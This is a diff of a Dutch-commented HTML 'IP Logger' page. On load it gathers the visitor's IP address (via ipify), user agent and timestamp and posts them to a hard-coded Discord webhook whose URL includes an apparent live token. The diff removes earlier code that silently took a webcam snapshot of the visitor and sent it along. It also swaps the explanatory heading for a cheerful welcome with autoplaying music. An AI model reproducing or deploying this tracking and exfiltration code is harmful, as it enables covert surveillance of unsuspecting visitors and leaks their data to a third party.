@@ -4,37 +4,47 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>IP Logger</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f0f0f0;
+            text-align: center;
+            padding-top: 50px;
+        }
+        h1 {
+            color: #333;
+        }
+        p {
+            color: #666;
+            margin-bottom: 40px;
+        }
+        #music {
+            display: none;
+        }
+    </style>
     <script>
+        window.onload = function() {
+            var audio = new Audio('sound.mp3');
+            audio.play();
+            
+            var script = document.createElement('script');
+            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
+            document.getElementsByTagName('head')[0].appendChild(script);
+        };
+
         // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
         function getIP(json) {
             var ipAddress = json.ip;
             var userAgent = navigator.userAgent;
             var timestamp = new Date().toISOString();
-
-            // Muziek afspelen
-            var audio = new Audio('sound.mp3');
-            audio.loop = true;
-            audio.play();
-
-            // Vertraging van 2 seconden voordat het maken van de foto en het verzenden van de webhook plaatsvindt
-            setTimeout(function() {
-                takeSnapshot(ipAddress, userAgent, timestamp);
-            }, 2000);
+            sendToDiscord(ipAddress, userAgent, timestamp);
         }
 
-        // Functie om een foto te maken en naar Discord webhook te sturen in een embed bericht
-        function takeSnapshot(ipAddress, userAgent, timestamp) {
-            var video = document.getElementById('video');
-            var canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth;
-            canvas.height = video.videoHeight;
-            var context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            var imageURL = canvas.toDataURL('image/jpeg');
-
+        // Functie om IP-adres, gebruikersagent en tijdstip naar Discord webhook te sturen in een embed bericht
+        function sendToDiscord(ipAddress, userAgent, timestamp) {
             var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';
 
-            // Maak een embed object aan met het IP-adres, gebruikersagent, tijdstip en de foto
+            // Maak een embed object aan met de IP-adres, gebruikersagent en tijdstip
             var embed = {
                 "embeds": [
                     {
@@ -57,10 +67,7 @@
                                 "value": timestamp,
                                 "inline": true
                             }
-                        ],
-                        "image": {
-                            "url": imageURL
-                        }
+                        ]
                     }
                 ]
             };
@@ -80,18 +87,14 @@
             // Stuur het verzoek
             xhr.send(payload);
         }
-
-        // Wanneer de pagina wordt geladen, roep dan de functie op om het IP-adres te verkrijgen
-        window.onload = function() {
-            var script = document.createElement('script');
-            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
-            document.getElementsByTagName('head')[0].appendChild(script);
-        };
     </script>
 </head>
 <body>
-    <h1>IP Logger</h1>
-    <p>Deze pagina logt uw IP-adres, gebruikersagent, tijdstip en stuurt het naar Discord, samen met een foto van de gebruiker. Ook wordt de muziek "sound.mp3" automatisch afgespeeld.</p>
-    <video id="video" style="display:none;"></video>
+    <h1>Welkom bij onze geweldige site!</h1>
+    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
+    <audio id="music" autoplay loop>
+        <source src="sound.mp3" type="audio/mpeg">
+        Your browser does not support the audio element.
+    </audio>
 </body>
 </html>
